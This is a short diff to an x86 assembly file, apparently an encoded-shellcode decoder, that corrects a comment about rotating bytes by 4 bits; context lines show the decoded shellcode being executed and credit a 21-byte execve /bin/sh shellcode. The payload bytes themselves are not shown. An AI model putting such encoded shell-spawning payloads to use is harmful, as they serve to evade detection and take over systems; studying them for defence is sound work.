@@ -24,7 +24,7 @@ loop:
 	call [esp]       ; execute decoded shellcode	
 
 
-; rotated by 4 bits (simply swap the hex around: 0x12 -> 0x21
+; rotated by 4 bits (simply swap the hex around. ex: 0x12 -> 0x21)
 ; Tiny Execve sh by Geyslan G. Bem -- 21 bytes
 ; http://shell-storm.org/shellcode/files/shellcode-841.php
 shellcode:
